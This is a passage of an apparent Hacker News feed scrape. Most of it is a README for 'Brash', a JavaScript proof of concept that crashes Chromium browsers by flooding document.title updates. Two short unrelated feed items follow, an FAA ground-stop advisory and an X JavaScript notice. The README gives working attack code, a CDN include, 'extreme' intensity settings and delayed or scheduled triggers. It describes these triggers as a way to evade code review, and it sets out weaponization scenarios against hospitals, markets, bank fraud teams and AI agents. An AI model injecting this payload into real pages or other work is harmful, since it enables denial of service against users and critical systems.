      &lt;item&gt;Firefox (Gecko engine) — immune to the attack&lt;/item&gt;
      &lt;item&gt;Safari (WebKit engine) — immune to the attack&lt;/item&gt;
      &lt;item&gt;iOS browsers (all use WebKit) — immune to the attack due to Apple's mandatory policy requiring all iOS browsers to use WebKit as their rendering engine, making Chromium-based browsers impossible on iOS&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Brash exploits a fundamental architectural flaw in the Blink rendering engine: the absence of throttling on &lt;code&gt;document.title&lt;/code&gt; updates. The attack operates in three critical phases:&lt;/p&gt;
    &lt;p&gt;Generates 100 unique hexadecimal strings of 512 characters and stores them in memory before starting the attack.&lt;/p&gt;
    &lt;p&gt;Why pre-load them instead of generating them in real-time?&lt;/p&gt;
    &lt;p&gt;Because constantly generating new strings consumes CPU time on mathematical operations. That time is critical—every millisecond spent generating strings is time NOT used to bombard the browser with &lt;code&gt;document.title&lt;/code&gt; updates.&lt;/p&gt;
    &lt;p&gt;By having 100 strings already loaded in memory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Faster attack: No pauses to generate strings&lt;/item&gt;
      &lt;item&gt;Focused CPU: 100% of resources dedicated to saturating the browser&lt;/item&gt;
      &lt;item&gt;Fewer system pauses: Prevents the garbage collector from constantly activating&lt;/item&gt;
      &lt;item&gt;Avoids detection: The 100 different strings prevent the browser from caching or optimizing updates&lt;/item&gt;
    &lt;/list&gt;
    &lt;quote&gt;
      &lt;p&gt;As a result, we achieve maximum injection speed with maximum memory consumption per update.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;code&gt;// Generates high-entropy unique IDs
gid: function() {
    let id = "";
    for (let i = 0x0; i &amp;lt; 0x200; i++) {
        id += ((Math.random() * 0x10) | 0x0).toString(0x10);
    }
    return id;
}&lt;/code&gt;
    &lt;p&gt;Executes configurable bursts of title updates. With default configuration (burst: 8000, interval: 1ms), it attempts to inject approximately 24 million updates per second, and it's during this attempt that the browser collapse begins.&lt;/p&gt;
    &lt;code&gt;// Triple-update pattern: maximizes rendering pipeline thrashing
inject: function() {
    const t = this.titles[Math.random() * this.titles.length | 0x0];
    for (let i = 0x0; i &amp;lt; 0x3; i++) {
        document.title = t + i;  // Each burst performs 3 sequential updates
    }
    this.counter += 0x3;
}&lt;/code&gt;
    &lt;p&gt;Continuous updates saturate the browser's main thread, preventing the processing of other events:&lt;/p&gt;
    &lt;p&gt;Collapse timeline:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;0-5s: Initial UI thread saturation, extreme CPU consumption&lt;/item&gt;
      &lt;item&gt;5-10s: Tab completely frozen, impossible to close&lt;/item&gt;
      &lt;item&gt;10-15s: Browser collapse or "Page Unresponsive" dialog&lt;/item&gt;
      &lt;item&gt;15-60s: Forced termination required (Chromium-based browsers)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why does it work?&lt;/p&gt;
    &lt;p&gt;Blink processes each &lt;code&gt;document.title&lt;/code&gt; change synchronously on the main thread without rate limiting. This creates a bottleneck that:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Blocks the event loop&lt;/item&gt;
      &lt;item&gt;Prevents user input processing&lt;/item&gt;
      &lt;item&gt;Saturates memory with long strings&lt;/item&gt;
      &lt;item&gt;Disrupts the compositor and rendering pipeline&lt;/item&gt;
      &lt;item&gt;Causes browser process thrashing&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To fully understand the impact of Brash, you can experience the exploit in different contexts, from a controlled live demo to your own implementation. Each option is designed for different levels of interaction and technical understanding.&lt;/p&gt;
    &lt;p&gt;The fastest way to see Brash in action. Visit https://brash.run&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;To see the exploit without a graphical interface, visit https://brash.run/hidden-live-demo.html. This version executes the injection invisibly, simulating a real attack.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;If you prefer to run the demo in your own environment, the exploit-demo/ directory included in the repository allows you to:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Controls to adjust attack intensity in real-time&lt;/item&gt;
      &lt;item&gt;Visual counter of updates per second&lt;/item&gt;
      &lt;item&gt;Three predefined modes: moderate, aggressive, and extreme&lt;/item&gt;
      &lt;item&gt;Observation of progressive browser collapse&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Simply open &lt;code&gt;exploit-demo/index.html&lt;/code&gt; in any Chromium browser and configure the &lt;code&gt;burst&lt;/code&gt; and &lt;code&gt;interval&lt;/code&gt; values before starting.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;burstSize: Title changes per interval (higher = more aggressive)&lt;/item&gt;
      &lt;item&gt;interval: Milliseconds between bursts (lower = more aggressive)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;To integrate Brash into your own security testing or research, include the script and configure the attack:&lt;/p&gt;
    &lt;p&gt;Include the script:&lt;/p&gt;
    &lt;code&gt;&amp;lt;!-- Local --&amp;gt;
&amp;lt;script src="brash.js"&amp;gt;&amp;lt;/script&amp;gt;

&amp;lt;!-- CDN --&amp;gt;
&amp;lt;script src="https://cdn.jsdelivr.net/gh/jofpin/brash/brash.js"&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;
    &lt;p&gt;API Usage:&lt;/p&gt;
    &lt;code&gt;// 1. Immediate attack
Brash.run({
    burstSize: 8000,
    interval: 1
});

// 2. Delay in seconds (default)
Brash.run({
    burstSize: 8000,
    interval: 1,
    delay: 30  // 30 seconds
});

// 3. Delay with strings
Brash.run({
    burstSize: 8000,
    interval: 1,
    delay: "30s"  // or "5000ms" or "3m"
});

// 4. Scheduled attack
Brash.run({
    burstSize: 8000,
    interval: 1,
    scheduled: "2025-10-18T09:30:00"
});&lt;/code&gt;
    &lt;p&gt;Intensity configurations:&lt;/p&gt;
    &lt;code&gt;// Moderate: controlled observation
// Effect: Browser responds slowly and allows observing gradual degradation
Brash.run({ 
    burstSize: 200,
    interval: 1000 // ~600 updates/sec
});

// Aggressive: rapid saturation
// Effect: Tabs freeze in 10-20 seconds
Brash.run({ 
    burstSize: 2000, 
    interval: 100 // ~60,000 updates/sec
});

// Extreme: instant collapse
// Effect: Immediate freeze, total crash in 15-30 seconds
Brash.run({ 
    burstSize: 8000,
    interval: 1 // Attempts ~24M updates/sec (browser collapses during the attempt)
});&lt;/code&gt;
    &lt;quote&gt;&lt;p&gt;Note: Each burst executes 3 sequential&lt;/p&gt;&lt;code&gt;document.title&lt;/code&gt;updates. For example, burstSize: 400 = 1,200 actual updates per interval.&lt;/quote&gt;
    &lt;p&gt;Brash can be weaponized in multiple critical contexts with consequences ranging from economic losses to human life risk.&lt;/p&gt;
    &lt;p&gt;A critical feature that amplifies Brash's danger is its ability to be programmed to execute at specific moments. An attacker can inject the code with a temporal trigger, remaining dormant until a predetermined exact time.&lt;/p&gt;
    &lt;p&gt;Technical implementation:&lt;/p&gt;
    &lt;code&gt;// Delay in seconds (default)
Brash.run({ burstSize: 8000, interval: 1, delay: 30 });

// Delay with strings (ms, s, m)
Brash.run({ burstSize: 8000, interval: 1, delay: "30s" });
Brash.run({ burstSize: 8000, interval: 1, delay: "5000ms" });

// Scheduled: executes at exact moment
Brash.run({ burstSize: 8000, interval: 1, scheduled: "2025-10-18T09:30:00" });&lt;/code&gt;
    &lt;p&gt;Parameters:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;burstSize&lt;/code&gt;: Updates per cycle&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;interval&lt;/code&gt;: Milliseconds between cycles&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;delay&lt;/code&gt;: Number (seconds) or string (&lt;code&gt;"30s"&lt;/code&gt;,&lt;code&gt;"5000ms"&lt;/code&gt;,&lt;code&gt;"3m"&lt;/code&gt;)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;scheduled&lt;/code&gt;: ISO string or Date object&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Why the &lt;code&gt;delay&lt;/code&gt; parameter is especially lethal:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Doesn't require knowing when they'll open the link: Simply waits X seconds from when the victim opens the page.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Time to establish trust: During the waiting minutes, the victim interacts with seemingly legitimate content (forms, documents, videos).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Evades initial inspection: If someone quickly reviews the code, it appears inactive. The attack doesn't execute until later.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Perfect psychological timing: Waits until the victim is deeply involved in the task (middle of exam, middle of meeting, during critical procedure).&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Typical scenario with &lt;code&gt;delay&lt;/code&gt;:&lt;/p&gt;
    &lt;code&gt;00:00 - Victim opens link "Q4 Documents.pdf"
00:30 - Victim reviews documents, appears legitimate
02:00 - Victim shares screen in meeting with 50 people
03:00 - ATTACK EXECUTES - all browsers collapse
&lt;/code&gt;
    &lt;p&gt;Why the &lt;code&gt;scheduled&lt;/code&gt; parameter is also devastating:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;Surgical synchronization: The attacker chooses the exact moment of maximum impact (market opening, peak operations time).&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Global coordinated attacks: Multiple targets can be hit simultaneously in the same second.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Evades prior detection: The malicious code can be present days or weeks beforehand without executing, passing security reviews.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Impossible to stop: By the time the attack executes, it's too late to prevent it.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Strategic timing examples:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;09:30 AM EST — Wall Street opening (maximum trading volatility)&lt;/item&gt;
      &lt;item&gt;03:00 AM — Hospital shift change (minimum staff, maximum vulnerability)&lt;/item&gt;
      &lt;item&gt;12:00 PM — Peak air traffic time (maximum number of simultaneous flights)&lt;/item&gt;
      &lt;item&gt;Black Friday 00:00 — Online sales start (maximum e-commerce traffic)&lt;/item&gt;
      &lt;item&gt;During live events — Presidential debates, Super Bowl, massive sporting events&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;This kinetic timing capability transforms Brash from a disruption tool into a temporal precision weapon, where the attacker controls not only the "what" and "where," but also the "when" with millisecond accuracy.&lt;/p&gt;
    &lt;p&gt;Scenario: Enterprise systems that depend on AI agents for web scraping, market analysis, competitor monitoring, or customer support automation use headless browsers (Chromium/Puppeteer) to query thousands of websites daily. An attacker injects Brash into popular sites that these agents query.&lt;/p&gt;
    &lt;p&gt;During critical automated operations:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;An AI agent queries a compromised financial news site for market analysis&lt;/item&gt;
      &lt;item&gt;Brash executes silently in the agent's headless browser&lt;/item&gt;
      &lt;item&gt;The browser process collapses, stopping the entire analysis pipeline&lt;/item&gt;
      &lt;item&gt;Downstream systems waiting for agent data enter timeout&lt;/item&gt;
      &lt;item&gt;Automated trading/pricing decisions are blocked&lt;/item&gt;
      &lt;item&gt;The monitoring system detects massive failures in multiple agents simultaneously&lt;/item&gt;
      &lt;item&gt;Manual intervention is required to restart the entire agent infrastructure&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Amplified attack vectors:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;AI research assistants: Agents that search and process web information for companies&lt;/item&gt;
      &lt;item&gt;Price monitoring bots: E-commerce systems that track competitor prices&lt;/item&gt;
      &lt;item&gt;SEO analysis tools: Services that crawl millions of pages for analysis&lt;/item&gt;
      &lt;item&gt;AI-powered customer support: Chatbots that query web documentation in real-time&lt;/item&gt;
      &lt;item&gt;Automated compliance scanning: Regulatory systems that monitor websites&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Real impact: Paralysis of critical automated operations, economic losses from unmade decisions, massive degradation of AI-dependent services, infrastructure recovery costs, exposure of critical dependency on automated agents.&lt;/p&gt;
    &lt;p&gt;Scenario: A cardiovascular surgeon is performing a coronary bypass operation assisted by a web-based surgical navigation system (increasingly common in minimally invasive surgeries). The system provides real-time images, patient vital metrics, and guidance for robotic instruments.&lt;/p&gt;
    &lt;p&gt;During the most critical phase of the operation, a browser notification appears: "ALERT: Critical surgical system update - Apply now or the operation may fail."&lt;/p&gt;
    &lt;p&gt;Upon clicking in panic:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;The browser collapses instantly along with the surgical navigation system&lt;/item&gt;
      &lt;item&gt;The surgeon loses visualization of guide images for 3-5 minutes&lt;/item&gt;
      &lt;item&gt;Real-time vital signs disappear from the screens&lt;/item&gt;
      &lt;item&gt;The medical team must improvise while restarting the system&lt;/item&gt;
      &lt;item&gt;The patient is in critical risk during the collapse window&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Real impact: Direct risk of patient death, potential for permanent damage, psychological trauma to the medical team, million-dollar lawsuits for technological negligence.&lt;/p&gt;
    &lt;p&gt;Scenario: During Wall Street market opening, a malicious actor injects Brash into multiple channels simultaneously: Bloomberg Terminal web interface, institutional trader chat, and specialized forums. The link promises "Leak: Fed emergency meeting transcript - Rate cut confirmed."&lt;/p&gt;
    &lt;p&gt;In the first 30 seconds of trading (maximum liquidity):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;200+ institutional traders click simultaneously&lt;/item&gt;
      &lt;item&gt;Their web terminals collapse just as they place million-dollar orders&lt;/item&gt;
      &lt;item&gt;Automated trading algorithms detect the sudden drop in activity as a "crash"&lt;/item&gt;
      &lt;item&gt;Massive automatic sell-offs are triggered&lt;/item&gt;
      &lt;item&gt;The market drops 5-7% in 90 seconds before circuit breakers&lt;/item&gt;
      &lt;item&gt;Millions of retail investors lose savings&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Real impact: Trillions of dollars in market capitalization losses, global financial panic, SEC investigations, potential confidence crisis in markets.&lt;/p&gt;
    &lt;p&gt;Scenario: Fraud analysts at a bank process suspicious transaction alerts in real-time through a web dashboard. During Black Friday (transaction peak), they receive Brash via corporate email: "New fraud pattern detected - urgent analysis required."&lt;/p&gt;
    &lt;p&gt;At the moment of highest transactional volume:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;20+ analysts open the link simultaneously&lt;/item&gt;
      &lt;item&gt;Fraud detection dashboards collapse&lt;/item&gt;
      &lt;item&gt;15-20 minutes of transactions go unreviewed&lt;/item&gt;
      &lt;item&gt;Attackers exploit the window to process thousands of stolen transactions&lt;/item&gt;
      &lt;item&gt;$2-5 million in fraud passes undetected&lt;/item&gt;
      &lt;item&gt;Automated systems are configured to allow transactions if analysts don't respond&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Real impact: Millions of dollars in direct losses, thousands of customers with fraudulent charges, massive reputational damage, regulatory fines for prevention system failures.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;These scenarios are not theoretical. The simplicity of Brash makes it a real threat to any operation that depends on web browsers, which in 2025 means practically everything.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;The creation of Brash is an effort to demonstrate what happens when basic protections are absent in the web technologies we use daily. The vulnerability doesn't lie in complex code or advanced techniques, but in the fundamental lack of rate limiting on an API that should be throttled by design.&lt;/p&gt;
    &lt;p&gt;The impact of Brash on over 3 billion Chromium browser users demonstrates that architectural flaws in core components like Blink have massive and global consequences. This is not an isolated bug—it's a design flaw that affects the entire Chromium ecosystem.&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Often, the most dangerous things hide in the least expected place, the most ignored one. - Jose Pino&lt;/p&gt;
    &lt;/quote&gt;
    &lt;p&gt;This PoC is intended solely for educational and security research purposes to help make the internet a safer place. Its execution should be carried out exclusively in controlled environments, and it must not be used on production systems, public websites, or devices containing important data.&lt;/p&gt;
    &lt;p&gt;Misuse of this exploit can result in browser crashes, data loss, and system instability. The author is not responsible for any damages, data loss, or legal consequences arising from the use or misuse of this PoC. By using Brash, you acknowledge understanding these risks and agree to use it only for legitimate security research in isolated environments.&lt;/p&gt;
    &lt;p&gt;Users are expected to comply with all applicable laws and regulations. Unauthorized use of this exploit against systems you do not own or have explicit permission to test is illegal and unethical.&lt;/p&gt;
    &lt;p&gt;The content of this project itself is licensed under the Creative Commons Attribution 3.0 license, and the underlying source code used to format and display that content is licensed under the MIT license.&lt;/p&gt;
    &lt;p&gt;Copyright (c) 2025 by Jose Pino&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45767343</guid><pubDate>Fri, 31 Oct 2025 01:16:14 +0000</pubDate></item><item><title>Ground stop at JFK due to staffing</title><link>https://www.fly.faa.gov/adv/adv_otherdis?advn=13&amp;adv_date=10312025&amp;facId=JFK&amp;title=ATCSCC%20ADVZY%20013%20JFK/ZNY%2010/31/2025%20CDM%20GROUND%20STOP&amp;titleDate=10/31/2025</link><description>&lt;doc fingerprint="51c2c3681ade0853"&gt;
  &lt;main&gt;
    &lt;row valign="top" align="left"&gt;
      &lt;cell class="nam"&gt;
        &lt;p&gt;MESSAGE: &lt;/p&gt;
      &lt;/cell&gt;
      &lt;cell class="val"&gt;
        &lt;quote&gt;CTL ELEMENT: JFK ELEMENT TYPE: APT ADL TIME: 0124Z GROUND STOP PERIOD: 31/0114Z - 31/0230Z CUMULATIVE PROGRAM PERIOD: 30/1613Z - 31/0359Z DEP FACILITIES INCLUDED: (Manual) ZTL ZDC ZJX ZMA ZME ZID PREVIOUS TOTAL, MAXIMUM, AVERAGE DELAYS: 6796 / 549 / 227 NEW TOTAL, MAXIMUM, AVERAGE DELAYS: 7920 / 609 / 264 PROBABILITY OF EXTENSION: MEDIUM IMPACTING CONDITION: STAFFING / STAFFING COMMENTS: &lt;/quote&gt;
      &lt;/cell&gt;
    &lt;/row&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45767505</guid><pubDate>Fri, 31 Oct 2025 01:48:39 +0000</pubDate></item><item><title>John Carmack on Mutable Variables</title><link>https://twitter.com/id_aa_carmack/status/1983593511703474196</link><description>&lt;doc fingerprint="d635f48b34542867"&gt;
  &lt;main&gt;
    &lt;p&gt;We’ve detected that JavaScript is disabled in this browser. Please enable JavaScript or switch to a supported browser to continue using x.com. You can see a list of supported browsers in our Help Center.&lt;/p&gt;
    &lt;p&gt;Help Center&lt;/p&gt;
    &lt;p&gt;Terms of Service Privacy Policy Cookie Policy Imprint Ads info © 2025 X Corp.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=45767725</guid><pubDate>Fri, 31 Oct 2025 02:34:36 +0000</pubDate></item></channel></rss>